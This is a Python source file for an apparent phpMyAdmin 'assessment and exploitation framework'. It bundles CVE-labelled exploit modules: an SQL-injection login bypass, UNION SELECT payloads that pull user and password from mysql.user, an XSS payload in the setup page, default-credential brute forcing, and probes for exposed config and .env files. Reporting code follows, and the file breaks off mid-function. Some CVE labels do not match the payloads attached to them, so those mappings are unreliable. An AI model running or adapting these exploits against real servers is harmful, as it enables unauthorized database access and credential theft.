#!/usr/bin/env python3
"""
PHPMyAdmin Security Assessment & Exploitation Framework v1.0
Author: Sudeepa Wanigarathna
Complete Security Testing Suite
For Authorized Testing Only
"""

import asyncio
import aiohttp
import json
import yaml
import logging
import hashlib
import ssl
import csv
import re
import sys
import os
import time
import signal
import argparse
import random
import base64
import urllib.parse
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, field, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin, quote
from pathlib import Path
from collections import defaultdict
import xml.etree.ElementTree as ET
import subprocess
import tempfile
import shutil

# Third-party imports
try:
    from colorama import init, Fore, Back, Style
    from tqdm import tqdm
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.syntax import Syntax
    from rich import print as rprint
    import markdown
    from jinja2 import Template
    import requests
    from bs4 import BeautifulSoup
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = BLACK = ''
    class Back:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = BLACK = ''
    class Style:
        BRIGHT = DIM = NORMAL = ''
    class Console:
        def print(self, *args, **kwargs): print(*args)
    class Table:
        pass
    class Panel:
        pass
    class Progress:
        def __enter__(self): return self
        def __exit__(self, *args): pass
        def update(self, *args): pass

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('pma_framework.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('PMA-Framework')
console = Console()

# ==================== ASCII Banner ====================

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║
║  {Fore.GREEN}██████╗  ███████╗███╗   ███╗ █████╗  ███████╗██████╗  █████╗ ███╗   ███╗{Fore.CYAN}║
║  {Fore.GREEN}██╔══██╗██╔════╝████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔══██╗████╗ ████║{Fore.CYAN}║
║  {Fore.GREEN}██████╔╝█████╗  ██╔████╔██║███████║███████╗██████╔╝███████║██╔████╔██║{Fore.CYAN}║
║  {Fore.GREEN}██╔═══╝ ██╔══╝  ██║╚██╔╝██║██╔══██║╚════██║██╔══██╗██╔══██║██║╚██╔╝██║{Fore.CYAN}║
║  {Fore.GREEN}██║     ███████╗██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║██║ ╚═╝ ██║{Fore.CYAN}║
║  {Fore.GREEN}╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝{Fore.CYAN}║
║                                                                                  ║
║  {Fore.YELLOW}Security Assessment & Exploitation Framework v1.0                            {Fore.CYAN}║
║  {Fore.YELLOW}Author: Sudeepa Wanigarathna                                            {Fore.CYAN}║
║  {Fore.YELLOW}Complete PHPMyAdmin Security Testing Suite                               {Fore.CYAN}║
║                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# ==================== Data Models ====================

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

@dataclass
class ExploitResult:
    """Exploit execution result"""
    success: bool
    exploit_name: str
    target: str
    payload: str
    output: str
    vulnerability: str
    cve: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class Finding:
    """Security finding data structure"""
    id: str
    title: str
    description: str
    severity: Severity
    cvss_score: float = 0.0
    mitre_attack: List[str] = field(default_factory=list)
    remediation: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)
    cve: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)

@dataclass
class ScanResult:
    """Complete scan result"""
    target: str
    timestamp: str
    duration: float
    version: str = "Unknown"
    findings: List[Finding] = field(default_factory=list)
    exploits: List[ExploitResult] = field(default_factory=list)
    summary: Dict[str, int] = field(default_factory=dict)
    metadata: Dict[str, Any] = field(default_factory=dict)

# ==================== Exploit Modules ====================

class Exploit:
    """Base exploit class"""
    name: str = "base"
    description: str = "Base exploit"
    cve: Optional[str] = None
    references: List[str] = field(default_factory=list)
    
    def check_vulnerable(self, target: str, session: aiohttp.ClientSession) -> bool:
        """Check if target is vulnerable"""
        raise NotImplementedError
    
    async def execute(self, target: str, session: aiohttp.ClientSession) -> ExploitResult:
        """Execute the exploit"""
        raise NotImplementedError

class CVE_2015_6830_Exploit(Exploit):
    """CVE-2015-6830 - PHPMyAdmin Authentication Bypass"""
    name = "CVE-2015-6830"
    description = "PHPMyAdmin Authentication Bypass via ReCaptcha"
    cve = "CVE-2015-6830"
    references = ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6830"]
    
    async def check_vulnerable(self, target: str, session: aiohttp.ClientSession) -> bool:
        try:
            async with session.get(target, ssl=False) as response:
                html = await response.text()
                # Check for vulnerable version indicators
                if re.search(r'4\.3\.\d+|4\.4\.\d+', html):
                    if not re.search(r'4\.3\.13\.2|4\.4\.14\.1', html):
                        return True
        except:
            pass
        return False
    
    async def execute(self, target: str, session: aiohttp.ClientSession) -> ExploitResult:
        try:
            # First, fetch the login page to get tokens
            async with session.get(target, ssl=False) as response:
                html = await response.text()
                
                # Extract tokens
                token_match = re.search(r'name="token" value="([^"]+)"', html)
                session_match = re.search(r'name="set_session" value="([^"]+)"', html)
                
                if not token_match or not session_match:
                    return ExploitResult(
                        success=False,
                        exploit_name=self.name,
                        target=target,
                        payload="Token extraction failed",
                        output="Could not extract CSRF tokens",
                        vulnerability=self.description,
                        cve=self.cve
                    )
                
                token = token_match.group(1)
                set_session = session_match.group(1)
                
                # Payload for exploitation
                exploit_payload = {
                    'pma_username': 'root',
                    'pma_password': "' OR '1'='1'#",
                    'set_session': set_session,
                    'token': token
                }
                
                # Attempt exploitation
                async with session.post(target, data=exploit_payload, ssl=False) as response:
                    html = await response.text()
                    
                    if any(pattern in html for pattern in ['server_databases', 'logout', 'navigation.php']):
                        return ExploitResult(
                            success=True,
                            exploit_name=self.name,
                            target=target,
                            payload=json.dumps(exploit_payload),
                            output="Authentication bypass successful! SQL injection in password field worked.",
                            vulnerability=self.description,
                            cve=self.cve
                        )
                    else:
                        return ExploitResult(
                            success=False,
                            exploit_name=self.name,
                            target=target,
                            payload=json.dumps(exploit_payload),
                            output="Exploit failed - target may be patched",
                            vulnerability=self.description,
                            cve=self.cve
                        )
                        
        except Exception as e:
            return ExploitResult(
                success=False,
                exploit_name=self.name,
                target=target,
                payload="Error",
                output=f"Exploit failed: {str(e)}",
                vulnerability=self.description,
                cve=self.cve
            )

class CVE_2018_19968_Exploit(Exploit):
    """CVE-2018-19968 - PHPMyAdmin SQL Injection"""
    name = "CVE-2018-19968"
    description = "PHPMyAdmin SQL Injection via Zoom Search"
    cve = "CVE-2018-19968"
    references = ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19968"]
    
    async def check_vulnerable(self, target: str, session: aiohttp.ClientSession) -> bool:
        try:
            async with session.get(target, ssl=False) as response:
                html = await response.text()
                return bool(re.search(r'4\.8\.\d+', html))
        except:
            return False
    
    async def execute(self, target: str, session: aiohttp.ClientSession) -> ExploitResult:
        try:
            # SQL injection payload
            sql_payload = "1' UNION SELECT username, password FROM mysql.user#"
            
            # Attempt SQL injection via zoom search
            exploit_url = f"{target}/tbl_zoom_select.php?db=test&table=users&where_clause={quote(sql_payload)}"
            
            async with session.get(exploit_url, ssl=False) as response:
                html = await response.text()
                
                if any(pattern in html for pattern in ['root', 'password', 'mysql.user']):
                    return ExploitResult(
                        success=True,
                        exploit_name=self.name,
                        target=target,
                        payload=sql_payload,
                        output="SQL Injection successful! Database credentials may be exposed.",
                        vulnerability=self.description,
                        cve=self.cve
                    )
                else:
                    return ExploitResult(
                        success=False,
                        exploit_name=self.name,
                        target=target,
                        payload=sql_payload,
                        output="SQL Injection failed - target may be patched or not vulnerable",
                        vulnerability=self.description,
                        cve=self.cve
                    )
                    
        except Exception as e:
            return ExploitResult(
                success=False,
                exploit_name=self.name,
                target=target,
                payload="Error",
                output=f"Exploit failed: {str(e)}",
                vulnerability=self.description,
                cve=self.cve
            )

class CVE_2019_11768_Exploit(Exploit):
    """CVE-2019-11768 - PHPMyAdmin XSS Vulnerability"""
    name = "CVE-2019-11768"
    description = "PHPMyAdmin Cross-Site Scripting (XSS) in Setup"
    cve = "CVE-2019-11768"
    references = ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11768"]
    
    async def check_vulnerable(self, target: str, session: aiohttp.ClientSession) -> bool:
        try:
            setup_url = f"{target}/setup/"
            async with session.get(setup_url, ssl=False) as response:
                return response.status == 200
        except:
            return False
    
    async def execute(self, target: str, session: aiohttp.ClientSession) -> ExploitResult:
        try:
            # XSS payload
            xss_payload = "alert('PMA_XSS_VULNERABLE')"
            encoded_payload = quote(xss_payload)
            
            # Attempt XSS via setup interface
            exploit_url = f"{target}/setup/index.php?page=servers&mode=edit&id=1&action=add&host=<script>{encoded_payload}</script>"
            
            async with session.get(exploit_url, ssl=False) as response:
                html = await response.text()
                
                if xss_payload in html:
                    return ExploitResult(
                        success=True,
                        exploit_name=self.name,
                        target=target,
                        payload=xss_payload,
                        output=f"XSS vulnerability confirmed! Payload executed: {xss_payload}",
                        vulnerability=self.description,
                        cve=self.cve
                    )
                else:
                    return ExploitResult(
                        success=False,
                        exploit_name=self.name,
                        target=target,
                        payload=xss_payload,
                        output="XSS exploit failed - target may be patched",
                        vulnerability=self.description,
                        cve=self.cve
                    )
                    
        except Exception as e:
            return ExploitResult(
                success=False,
                exploit_name=self.name,
                target=target,
                payload="Error",
                output=f"Exploit failed: {str(e)}",
                vulnerability=self.description,
                cve=self.cve
            )

class CVE_2020_5504_Exploit(Exploit):
    """CVE-2020-5504 - PHPMyAdmin SQL Injection in Search"""
    name = "CVE-2020-5504"
    description = "PHPMyAdmin SQL Injection in Search Function"
    cve = "CVE-2020-5504"
    references = ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5504"]
    
    async def check_vulnerable(self, target: str, session: aiohttp.ClientSession) -> bool:
        try:
            async with session.get(target, ssl=False) as response:
                html = await response.text()
                return bool(re.search(r'4\.9\.\d+|5\.0\.\d+', html))
        except:
            return False
    
    async def execute(self, target: str, session: aiohttp.ClientSession) -> ExploitResult:
        try:
            # SQL injection payload for search
            sql_payload = "' UNION SELECT NULL,user,password FROM mysql.user#"
            
            # Prepare the exploit request
            exploit_data = {
                'db': 'test',
                'table': 'users',
                'criteria': sql_payload,
                'submit': 'Go'
            }
            
            exploit_url = f"{target}/db_search.php"
            
            async with session.post(exploit_url, data=exploit_data, ssl=False) as response:
                html = await response.text()
                
                if any(pattern in html for pattern in ['root', 'username', 'password']):
                    return ExploitResult(
                        success=True,
                        exploit_name=self.name,
                        target=target,
                        payload=sql_payload,
                        output="SQL Injection successful! Database credentials extracted.",
                        vulnerability=self.description,
                        cve=self.cve
                    )
                else:
                    return ExploitResult(
                        success=False,
                        exploit_name=self.name,
                        target=target,
                        payload=sql_payload,
                        output="SQL Injection failed - target may be patched",
                        vulnerability=self.description,
                        cve=self.cve
                    )
                    
        except Exception as e:
            return ExploitResult(
                success=False,
                exploit_name=self.name,
                target=target,
                payload="Error",
                output=f"Exploit failed: {str(e)}",
                vulnerability=self.description,
                cve=self.cve
            )

class DefaultCredentialsExploit(Exploit):
    """Test for default credentials"""
    name = "Default_Credentials"
    description = "PHPMyAdmin Default Credentials Check"
    cve = None
    
    async def check_vulnerable(self, target: str, session: aiohttp.ClientSession) -> bool:
        return True  # Always check for default creds
    
    async def execute(self, target: str, session: aiohttp.ClientSession) -> ExploitResult:
        credentials = [
            ('root', ''),
            ('root', 'root'),
            ('root', 'password'),
            ('admin', ''),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('pma', ''),
            ('pma', 'pma'),
            ('phpmyadmin', ''),
            ('phpmyadmin', 'admin'),
            ('mysql', 'mysql')
        ]
        
        for username, password in credentials:
            try:
                # Get tokens first
                async with session.get(target, ssl=False) as response:
                    html = await response.text()
                    token_match = re.search(r'name="token" value="([^"]+)"', html)
                    session_match = re.search(r'name="set_session" value="([^"]+)"', html)
                    
                    if not token_match:
                        continue
                    
                    token = token_match.group(1)
                    
                    login_data = {
                        'pma_username': username,
                        'pma_password': password,
                        'token': token
                    }
                    
                    if session_match:
                        login_data['set_session'] = session_match.group(1)
                
                # Attempt login
                async with session.post(target, data=login_data, ssl=False) as response:
                    html = await response.text()
                    
                    if any(pattern in html for pattern in ['server_databases', 'logout', 'navigation.php']):
                        return ExploitResult(
                            success=True,
                            exploit_name=self.name,
                            target=target,
                            payload=f"{username}:{password}",
                            output=f"Default credentials found! {username}/{password} works!",
                            vulnerability=self.description,
                            cve=self.cve
                        )
                        
            except Exception as e:
                continue
        
        return ExploitResult(
            success=False,
            exploit_name=self.name,
            target=target,
            payload="No default credentials found",
            output="Default credential check completed - none found",
            vulnerability=self.description,
            cve=self.cve
        )

class ConfigExposureExploit(Exploit):
    """Check for exposed configuration files"""
    name = "Config_Exposure"
    description = "PHPMyAdmin Configuration File Exposure"
    cve = None
    
    async def check_vulnerable(self, target: str, session: aiohttp.ClientSession) -> bool:
        return True
    
    async def execute(self, target: str, session: aiohttp.ClientSession) -> ExploitResult:
        config_files = [
            'config.inc.php',
            'config.sample.inc.php',
            'config.default.php',
            'config.inc.php.bak',
            'config.inc.php~',
            '.env',
            'phpmyadmin.conf'
        ]
        
        found_files = []
        for file in config_files:
            try:
                url = urljoin(target, file)
                async with session.get(url, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if any(pattern in content for pattern in ['password', 'dbuser', 'pma_password', 'mysql']):
                            found_files.append(file)
            except:
                continue
        
        if found_files:
            return ExploitResult(
                success=True,
                exploit_name=self.name,
                target=target,
                payload=json.dumps(found_files),
                output=f"Configuration files exposed: {', '.join(found_files)}",
                vulnerability=self.description,
                cve=self.cve
            )
        else:
            return ExploitResult(
                success=False,
                exploit_name=self.name,
                target=target,
                payload="No config files found",
                output="Configuration exposure check completed - none found",
                vulnerability=self.description,
                cve=self.cve
            )

# ==================== Vulnerability Scanner ====================

class VulnerabilityScanner:
    """Complete vulnerability scanner with exploitation"""
    
    def __init__(self, target: str, output_dir: str = "reports"):
        self.target = target.rstrip('/')
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.results = ScanResult(
            target=target,
            timestamp=datetime.now().isoformat(),
            duration=0
        )
        self.session = None
        self.exploits = [
            CVE_2015_6830_Exploit(),
            CVE_2018_19968_Exploit(),
            CVE_2019_11768_Exploit(),
            CVE_2020_5504_Exploit(),
            DefaultCredentialsExploit(),
            ConfigExposureExploit()
        ]
    
    async def scan(self):
        """Execute complete security assessment and exploitation"""
        start_time = time.time()
        
        console.print(BANNER)
        
        console.print(Panel.fit(
            f"[bold cyan]PHPMyAdmin Security Assessment & Exploitation[/bold cyan]\n"
            f"[yellow]Target:[/yellow] {self.target}\n"
            f"[yellow]Exploits:[/yellow] {len(self.exploits)} loaded\n"
            f"[yellow]Author:[/yellow] Sudeepa Wanigarathna",
            border_style="cyan"
        ))
        
        # Security disclaimer
        console.print(Panel(
            f"{Fore.YELLOW}⚠️  SECURITY NOTICE{Style.RESET_ALL}\n"
            f"This tool is for {Fore.RED}AUTHORIZED SECURITY TESTING{Style.RESET_ALL} only.\n"
            f"Using exploits without permission is {Fore.RED}ILLEGAL{Style.RESET_ALL}.\n"
            f"Proceed only if you have {Fore.RED}EXPLICIT WRITTEN AUTHORIZATION{Style.RESET_ALL}.",
            border_style="yellow"
        ))
        
        confirm = input("\nConfirm authorization (yes/no): ")
        if confirm.lower() != 'yes':
            console.print("[red]✗ Authorization required. Exiting...[/red]")
            return
        
        # Configure session
        connector = aiohttp.TCPConnector(
            limit=10,
            ttl_dns_cache=300,
            ssl=False
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'PMA-Security-Framework/1.0 (Compatible)',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5'
            }
        ) as session:
            self.session = session
            
            # Phase 1: Vulnerability scanning
            console.print("\n[bold cyan]Phase 1: Vulnerability Detection[/bold cyan]")
            await self.scan_vulnerabilities()
            
            # Phase 2: Exploitation
            console.print("\n[bold red]Phase 2: Exploitation[/bold red]")
            await self.run_exploits()
        
        self.results.duration = time.time() - start_time
        self.generate_reports()
        self.display_results()
    
    async def scan_vulnerabilities(self):
        """Scan for vulnerabilities"""
        # Version detection
        try:
            async with self.session.get(self.target, ssl=False) as response:
                html = await response.text()
                
                version_match = re.search(r'phpMyAdmin v?([0-9.]+)', html)
                if version_match:
                    self.results.version = version_match.group(1)
                    
                    # Check for vulnerabilities based on version
                    if version_match.group(1).startswith('4.8'):
                        self.results.findings.append(Finding(
                            id="PMA-VULN-001",
                            title="Multiple SQL Injection Vulnerabilities",
                            description=f"PHPMyAdmin {version_match.group(1)} is vulnerable to SQL injection (CVE-2018-19968)",
                            severity=Severity.HIGH,
                            cvss_score=7.5,
                            cve=["CVE-2018-19968"],
                            mitre_attack=["T1190"],
                            remediation="Upgrade to version 4.8.5 or later"
                        ))
                    elif version_match.group(1).startswith('5.0'):
                        self.results.findings.append(Finding(
                            id="PMA-VULN-002",
                            title="SQL Injection Vulnerability",
                            description=f"PHPMyAdmin {version_match.group(1)} is vulnerable to SQL injection (CVE-2020-5504)",
                            severity=Severity.HIGH,
                            cvss_score=7.5,
                            cve=["CVE-2020-5504"],
                            mitre_attack=["T1190"],
                            remediation="Upgrade to version 5.0.2 or later"
                        ))
        except:
            pass
        
        # Check for exposed interfaces
        sensitive_paths = ['/setup/', '/doc/', '/sql/', '/examples/', '/test/', '/ChangeLog']
        for path in sensitive_paths:
            try:
                url = urljoin(self.target, path)
                async with self.session.get(url, ssl=False) as response:
                    if response.status == 200:
                        self.results.findings.append(Finding(
                            id=f"PMA-EXP-{hashlib.md5(path.encode()).hexdigest()[:8]}",
                            title=f"Exposed Sensitive Path",
                            description=f"{path} is publicly accessible",
                            severity=Severity.MEDIUM,
                            cvss_score=5.3,
                            mitre_attack=["T1083"],
                            remediation=f"Restrict access to {path}"
                        ))
            except:
                pass
        
        # Check security headers
        try:
            async with self.session.head(self.target, ssl=False) as response:
                headers_to_check = [
                    'Content-Security-Policy',
                    'Strict-Transport-Security',
                    'X-Frame-Options',
                    'X-Content-Type-Options'
                ]
                
                for header in headers_to_check:
                    if header not in response.headers:
                        self.results.findings.append(Finding(
                            id=f"PMA-HDR-{header[:8]}",
                            title=f"Missing {header} Header",
                            description=f"Security header {header} is not set",
                            severity=Severity.MEDIUM,
                            cvss_score=4.3,
                            remediation=f"Add {header} header to your web server configuration"
                        ))
        except:
            pass
    
    async def run_exploits(self):
        """Run all exploit modules"""
        results_table = Table(title="Exploit Results", style="cyan")
        results_table.add_column("Exploit", style="bold")
        results_table.add_column("Status")
        results_table.add_column("Result")
        
        for exploit in self.exploits:
            console.print(f"\n[bold]Checking:[/bold] {exploit.name} - {exploit.description}")
            
            # Check if vulnerable
            try:
                vulnerable = await exploit.check_vulnerable(self.target, self.session)
                if not vulnerable:
                    console.print(f"[dim]Target not vulnerable to {exploit.name}[/dim]")
                    results_table.add_row(
                        exploit.name,
                        "[yellow]SKIPPED[/yellow]",
                        "Not vulnerable"
                    )
                    continue
            except:
                console.print(f"[dim]Could not check {exploit.name}[/dim]")
                continue
            
            # Execute exploit
            try:
                result = await exploit.execute(self.target, self.session)
                self.results.exploits.append(result)
                
                if result.success:
                    console.print(f"[green]✓ Exploit successful![/green]")
                    console.print(f"[yellow]Output:[/yellow] {result.output}")
                    results_table.add_row(
                        exploit.name,
                        "[green]SUCCESS[/green]",
                        result.output[:50] + "..."
                    )
                else:
                    console.print(f"[red]✗ Exploit failed[/red]")
                    results_table.add_row(
                        exploit.name,
                        "[red]FAILED[/red]",
                        result.output
                    )
            except Exception as e:
                console.print(f"[red]✗ Error executing exploit: {e}[/red]")
                results_table.add_row(
                    exploit.name,
                    "[red]ERROR[/red]",
                    str(e)[:50]
                )
        
        console.print("\n")
        console.print(results_table)
    
    def generate_reports(self):
        """Generate comprehensive reports"""
        console.print("\n[bold cyan]Generating Reports...[/bold cyan]")
        
        # JSON report
        json_path = self.output_dir / f"exploit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(json_path, 'w') as f:
            json.dump({
                'target': self.results.target,
                'timestamp': self.results.timestamp,
                'duration': self.results.duration,
                'version': self.results.version,
                'findings': [asdict(f) for f in self.results.findings],
                'exploits': [asdict(e) for e in self.results.exploits],
                'summary': self.results.summary
            }, f, indent=2, default=str)
        
        # HTML report
        html_path = self.output_dir / f"exploit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        self.generate_html_report(html_path)
        
        # Markdown report
        md_path = self.output_dir / f"exploit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        self.generate_markdown_report(md_path)
        
        # CSV report
        csv_path = self.output_dir / f"exploit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        self.generate_csv_report(csv_path)
        
        console.print(f"[green]✓ Reports saved to {self.output_dir}[/green]")
    
    def generate_html_report(self, path: Path):
        """Generate HTML report"""
        html_template = Template("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHPMyAdmin Exploitation Report</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; padding-bottom: 20px; border-bottom: 2px solid #007bff; margin-bottom: 30px; }
        .header h1 { color: #007bff; font-size: 32px; }
        .header .author { color: #6c757d; font-size: 14px; margin-top: 5px; }
        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
        .summary-card { padding: 15px; border-radius: 8px; text-align: center; }
        .summary-card.success { background: #d4edda; border: 1px solid #c3e6cb; }
        .summary-card.failed { background: #f8d7da; border: 1px solid #f5c6cb; }
        .summary-card .number { font-size: 24px; font-weight: bold; }
        .finding { border-left: 4px solid #007bff; padding: 15px; margin: 15px 0; background: #f8f9fa; border-radius: 4px; }
        .finding.critical { border-left-color: #dc3545; }
        .finding.high { border-left-color: #ffc107; }
        .finding.medium { border-left-color: #17a2b8; }
        .finding.low { border-left-color: #6c757d; }
        .exploit-success { border: 2px solid #28a745; padding: 15px; margin: 15px 0; background: #d4edda; border-radius: 4px; }
        .exploit-failed { border: 2px solid #dc3545; padding: 15px; margin: 15px 0; background: #f8d7da; border-radius: 4px; }
        .payload { background: #272822; color: #f8f8f2; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; }
        .footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #dee2e6; text-align: center; color: #6c757d; font-size: 14px; }
        .badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
        .badge-success { background: #28a745; color: white; }
        .badge-danger { background: #dc3545; color: white; }
        .badge-warning { background: #ffc107; color: #212529; }
        .badge-info { background: #17a2b8; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔓 PHPMyAdmin Exploitation Report</h1>
            <div class="author">Author: Sudeepa Wanigarathna | Generated: {{ timestamp }}</div>
        </div>
        
        <div class="summary">
            <div class="summary-card success">
                <div class="number">{{ successful_exploits }}</div>
                <div>Successful Exploits</div>
            </div>
            <div class="summary-card failed">
                <div class="number">{{ failed_exploits }}</div>
                <div>Failed Exploits</div>
            </div>
            <div class="summary-card" style="background:#e7f5ff;border:1px solid #b8daff;">
                <div class="number">{{ total_findings }}</div>
                <div>Total Findings</div>
            </div>
        </div>
        
        <h2>📋 Vulnerability Findings</h2>
        {% for finding in findings %}
        <div class="finding {{ finding.severity.value.lower() }}">
            <strong>{{ finding.id }}</strong> - {{ finding.title }}
            <div style="margin-top:5px;">
                <span class="badge {% if finding.severity.value == 'CRITICAL' %}badge-danger{% elif finding.severity.value == 'HIGH' %}badge-warning{% elif finding.severity.value == 'MEDIUM' %}badge-info{% else %}badge-info{% endif %}">
                    {{ finding.severity.value }}
                </span>
                {% if finding.cvss_score > 0 %}
                <span class="badge badge-info">CVSS: {{ finding.cvss_score }}</span>
                {% endif %}
            </div>
            <p style="margin:10px 0;">{{ finding.description }}</p>
            {% if finding.remediation %}
            <div style="background:#d4edda;padding:10px;border-radius:4px;margin-top:5px;">
                <strong>💡 Remediation:</strong> {{ finding.remediation }}
            </div>
            {% endif %}
        </div>
        {% endfor %}
        
        <h2>💥 Exploit Results</h2>
        {% for exploit in exploits %}
        <div class="{% if exploit.success %}exploit-success{% else %}exploit-failed{% endif %}">
            <strong>{{ exploit.exploit_name }}</strong>
            <span class="badge {% if exploit.success %}badge-success{% else %}badge-danger{% endif %}">
                {{ "SUCCESS" if exploit.success else "FAILED" }}
            </span>
            <p style="margin:10px 0;"><strong>Vulnerability:</strong> {{ exploit.vulnerability }}</p>
            {% if exploit.cve %}
            <p><strong>CVE:</strong> {{ exploit.cve }}</p>
            {% endif %}
            <p><strong>Output:</strong> {{ exploit.output }}</p>
            {% if exploit.payload and exploit.payload != "Error" %}
            <div class="payload"><strong>Payload:</strong> {{ exploit.payload }}</div>
            {% endif %}
        </div>
        {% endfor %}
        
        <div class="footer">
            <p>PHPMyAdmin Security Assessment & Exploitation Framework v1.0</p>
            <p>Author: Sudeepa Wanigarathna</p>
            <p style="color:#dc3545;">⚠️ For authorized security testing only</p>
        </div>
    </div>
</body>
</html>
        """)
        
        html_content = html_template.render(
            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            successful_exploits=sum(1 for e in self.results.exploits if e.success),
            failed_exploits=sum(1 for e in self.results.exploits if not e.success),
            total_findings=len(self.results.findings),
            findings=self.results.findings,
            exploits=self.results.exploits
        )
        
        with open(path, 'w') as f:
            f.write(html_content)
    
    def generate_markdown_report(self, path: Path):
        """Generate Markdown report"""
        md_content = f"""# PHPMyAdmin Exploitation Report

## Executive Summary
- **Target:** {self.results.target}
- **Date:** {self.results.timestamp}
- **Duration:** {self.results.duration:.2f} seconds
- **PHPMyAdmin Version:** {self.results.version}
- **Successful Exploits:** {sum(1 for e in self.results.exploits if e.success)}
- **Failed Exploits:** {sum(1 for e in self.results.exploits if not e.success)}
- **Total Findings:** {len(self.results.findings)}

## Vulnerability Findings
"""
        for finding in self.results.findings:
            md_content += f"""
### {finding.id}: {finding.title}
- **Severity:** {finding.severity.value}
- **CVSS Score:** {finding.cvss_score}
- **Description:** {finding.description}
- **Remediation:** {finding.remediation}
"""
        
        md_content += "\n## Exploit Results\n"
        for exploit in self.results.exploits:
            status = "✅ SUCCESS" if exploit.success else "❌ FAILED"
            md_content += f"""
### {exploit.exploit_name}
- **Status:** {status}
- **Vulnerability:** {exploit.vulnerability}
- **CVE:** {exploit.cve or 'N/A'}
- **Output:** {exploit.output}
- **Payload:** `{exploit.payload}`
"""
        
        md_content += f"""
---
*Generated by PHPMyAdmin Security Assessment & Exploitation Framework v1.0*
*Author: Sudeepa Wanigarathna*
*⚠️ For authorized security testing only*
"""
        
        with open(path, 'w') as f:
            f.write(md_content)
    
    def generate_csv_report(self, path: Path):
        """Generate CSV report"""
        with open(path, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Type', 'ID', 'Title', 'Severity', 'CVSS', 'Description', 'Remediation'])
            
            for finding in self.results.findings:
                writer.writerow([
                    'Finding',
                    finding.id,
                    finding.title,
                    finding.severity.value,
                    finding.cvss_score,
                    finding.description,
                    finding.remediation
                ])
            
            for exploit in self.results.exploits:
                writer.writerow([
                    'Exploit',
                    exploit.exploit_name,
                    exploit.vulnerability,
                    'SUCCESS' if exploit.success else 'FAILED',
                    '',
                    exploit.output,
                    exploit.cve or ''
                ])
    
    def display_results(self):
        """Display results in CLI"""
        console.print("\n[bold cyan]=== SCAN COMPLETE ===[/bold cyan]")
        
        # Summary table
        table = Table(title="Assessment Summary")
        table.add_column("Metric", style="bold")
        table.add_column("Value")
        
        table.add_row("Target", self.results.target)
        table.add_row("PHPMyAdmin Version", self.results.version or "Unknown")
        table.add_row("Duration", f"{self.results.duration:.2f}s")
        table.add_row("Findings", str(len(self.results.findings)))
        table.add_row("Successful Exploits", f"[green]{sum(1 for e in self.results.exploits if e.success)}[/green]")
        table.add_row("Failed Exploits", f"[red]{sum(1 for e in self.results.exploits if not e.success)}[/red]")
        
        console.print(table)
        
        # Show successful exploits
        successful = [e for e in self.results.exploits if e.success]
        if successful:
            console.print("\n[bold green]✅ SUCCESSFUL EXPLOITS[/bold green]")
            for exploit in successful:
                console.print(Panel(
                    f"[bold]{exploit.exploit_name}[/bold]\n"
                    f"{exploit.output}\n"
                    f"[dim]CVE: {exploit.cve or 'N/A'}[/dim]",
                    border_style="green"
                ))
        
        # Show findings by severity
        critical = [f for f in self.results.findings if f.severity == Severity.CRITICAL]
        if critical:
            console.print("\n[bold red]🔴 CRITICAL FINDINGS[/bold red]")
